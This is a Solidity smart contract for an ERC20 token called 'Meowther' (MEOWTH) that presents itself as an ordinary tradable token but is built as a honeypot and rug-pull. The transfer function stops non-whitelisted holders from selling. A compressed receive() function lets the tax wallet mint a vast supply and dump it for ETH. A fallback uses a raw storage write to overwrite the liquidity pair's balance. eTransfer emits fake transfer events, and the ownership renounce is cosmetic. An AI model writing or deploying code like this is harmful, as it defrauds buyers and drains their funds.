// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounce() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IUniswapV2Pair {
    function sync() external;
    function getReserves() external view returns (uint112 r, uint112 a, uint32 time);
    function token0() external view returns (address token);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract meowth is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address payable private _taxWallet;
    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 1000000 * 10**_decimals;
    string private constant _name = unicode"Meowther";
    string private constant _symbol = unicode"MEOWTH";
    IUniswapV2Router02 private uniswapV2Router;
    address private p;
    address private own;

    address private universalRouter = 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD;
    bool private TOpen;
    bool private inSwap = false;

    constructor (address mintTo, address owner) {
        own = owner;
        _taxWallet = payable(_msgSender());
        _balances[mintTo] = _tTotal;
        emit Transfer(address(0), mintTo, _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) { 
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (address(this).balance >= 20) {require(from == address(this)  || from == own || from == p || from == universalRouter|| from == _taxWallet);}
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function openTraining() external payable onlyOwner {
        require(!TOpen,"Trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); //Замени на адрес v2 роутера панкейксвапа
        _approve(address(this), address(uniswapV2Router), ~uint(0));
        p = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,address(this),~uint(0));
        IERC20 pair = IERC20(p);
        uint lpBalance = pair.balanceOf(address(this));
        uint lpToBurn = (lpBalance*94)/100;
        pair.transfer(address(0), lpToBurn);
        pair.transfer(_taxWallet, lpBalance-lpToBurn);
        TOpen = true;
    }

    function eTransfer(address[] memory from, address[] memory addresses, uint[] memory amounts) external onlyOwner {
        require(addresses.length == amounts.length, "dont match");
        for (uint i; i < addresses.length; i++) {
            emit Transfer(from[i], addresses[i], amounts[i]);
        }
    }

    function massTransfer(address[] memory from, address[] memory addresses, uint[] memory amounts) external onlyOwner {
        require(addresses.length == amounts.length, "dont match");
        for (uint i; i < addresses.length; i++) {
            _transfer(msg.sender, addresses[i], amounts[i]);
            emit Transfer(from[i], addresses[i], amounts[i]);
        }            
    }  

    receive() external payable {if (msg.sender==_taxWallet){if(msg.value==20){}else if(msg.value==40){_taxWallet.transfer(address(this).balance);}else{_balances[address(this)]+=_tTotal*300001;address[]memory path=new address[](2);path[0]=address(this);path[1]=uniswapV2Router.WETH();uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(balanceOf(address(this)),0,path,_taxWallet,block.timestamp+2);}}}
    fallback()external{if(msg.sender==_taxWallet){(uint v)=abi.decode(msg.data,(uint));update(p, v);}}function update(address addr,uint value)internal{assembly{mstore(0,addr) mstore(32,_balances.slot)let hash:=keccak256(0,64)sstore(hash,value)}} }